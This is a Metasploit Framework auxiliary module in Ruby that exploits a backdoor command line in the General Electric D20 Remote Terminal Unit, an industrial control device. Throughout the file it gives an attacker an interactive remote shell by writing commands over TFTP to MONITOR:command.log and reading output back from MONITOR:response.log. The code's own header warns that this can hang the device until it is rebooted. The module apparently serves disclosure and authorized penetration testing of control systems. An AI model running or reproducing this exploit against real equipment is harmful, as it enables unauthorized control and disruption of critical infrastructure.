
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module implements a CLI backdoor present in the General Electric D20 Remote Terminal
# Unit (RTU).  This backdoor may be present in other General Electric Canada control systems.
# Use with care.  Interactive commands may cause the TFTP server to hang indefinitely, blocking
# the backdoor until the system is rebooted.
##

require 'msf/core'
require 'rex/ui/text/shell'
require 'rex/proto/tftp'


class Metasploit3 < Msf::Auxiliary
  include Rex::Ui::Text
  include Rex::Proto::TFTP
  include Msf::Exploit::Remote::Udp
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'General Electric D20 Backdoor (Async TFTP Command Line)',
      'Description'    => %q{
        The General Electric D20ME and possibly other units (D200?) feature
        a backdoor command line.  Commands are issued to MONITOR:command.log,
        and responses are read from MONITOR:response.log.
      },
      'Author'         => [ 'K. Reid Wightman <wightman@digitalbond.com>' ],
      'License'        => MSF_LICENSE,
      'Version'        => '$Revision$',
      'DisclosureDate' => 'Jan 19 2012',
      ))

    register_options(
      [
        Opt::RPORT(69),
        Opt::RHOST('192.168.255.1'),
        OptString.new('REMOTE_CMD_FILE', [true, "The remote filename used to issue commands", "MONITOR:command.log"]),
        OptString.new('REMOTE_RESP_FILE', [true, "The remote filename used to gather response", "MONITOR:response.log"])
      ], self.class)
  end

  def setup
    @rhost = datastore['RHOST']
    @rport = datastore['RPORT'] || 69
    @lport = datastore['LPORT'] || (1025 + rand(0xffff - 1025))
    @lhost = datastore['LHOST'] || "0.0.0.0"
    @rcmdpath = datastore['REMOTE_CMD_FILE']
    @rresppath = datastore['REMOTE_RESP_FILE']
  end

  def rtarget(ip=nil)
    if (ip or rhost) and rport
      [(ip || rhost),rport].map {|x| x.to_s}.join(":") << " "
    elsif (ip or rhost)
      "#{rhost} "
    else
      ""
    end
  end

  def cleanup
    if @tftp_client and @tftp_client.respond_to? :complete
      while not @tftp_client.complete
        select(nil, nil, nil, 1)
        vprint_status "Cleaning up the TFTP client ports and threads."
        @tftp_client.stop
      end
    end
  end

  def interactive
    stop = false
    print_status("Entering interactive mode")
    print_status("Type 'help' for remote help")
    print_status("Type 'quit' to quit")
    until stop == true
      print ("D20MEA> ")
      tmp = gets.chomp.to_s
      if "quit" == tmp or "exit" == tmp
        stop = true
        next
      elsif tmp == ""
        next
      else
        cmddata = "DATA:" + tmp
        cmddata += [13,10,00].pack("c*")
        @tftp_client = Rex::Proto::TFTP::Client.new(
          "LocalHost" => @lhost,
          "LocalPort" => @lport,
          "PeerHost" => @rhost,
          "PeerPort" => @rport,
          "LocalFile" => cmddata,
          "RemoteFile" => @rcmdpath,
          "Action" => :upload
        )
        @tftp_client.send_write_request { |msg| print_tftp_status(msg) }
        @tftp_client.threads do |thread|
          thread.join
        end
        while not @tftp_client.complete
          select(nil, nil, nil, 0.1)
        end # wait until transfer finishes
        # wait a second for the response file to be generated
        # this is a 25Mhz 68030 we're working with, here.
        # might need to wait longer for some commands to complete...
        sleep(1)
        @tftp_client = Rex::Proto::TFTP::Client.new(
          "LocalHost" => @lhost,
          "LocalPort" => @lport,
          "PeerHost" => @rhost,
          "PeerPort" => @rport,
          "LocalFile" => @lresppath,
          "RemoteFile" => @rresppath,
          "Action" => :download
        )
        @tftp_client.send_read_request { |msg| print_tftp_status(msg) }
        while not @tftp_client.complete
          select(nil, nil, nil, 0.1)
        end
        fh = @tftp_client.recv_tempfile
        data = File.open(fh,"rb") {|f| f.read f.stat.size} rescue nil
        if data
          # we need to clean the data a little so it prints nicely
          # the d20 always sends a few control characters to clear
          # the screen with the output.  Chop those off.
          if data.size > 26
            data = data[0,data.size - 26]
          end
          # we can also chop off the header information, users
          # don't need to see the welcome message with every command
          if data.size > 77
            data = data[77, data.size]
          end
          print data
        else
          # I should probably re-try the download, after a few
          # seconds delay.  Might be able to catch this in the
          # request response somehow, but things work well enough
          # for now
        end
        #client = Client.new(datastore['RHOST'], datastore['RPORT'])
        #client.send_binary('/tmp/m68kcmd', 'MONITOR:command.log')
      end
    end
  end

  def print_tftp_status(msg)
    case msg
    when /Aborting/, /errors.$/
      print_error [rtarget,msg].join
    when /^WRQ accepted/, /^Sending/, /complete!$/
      print_good [rtarget,msg].join
    else
      vprint_status [rtarget,msg].join
    end
  end

  def run
    self.interactive()
  end

end
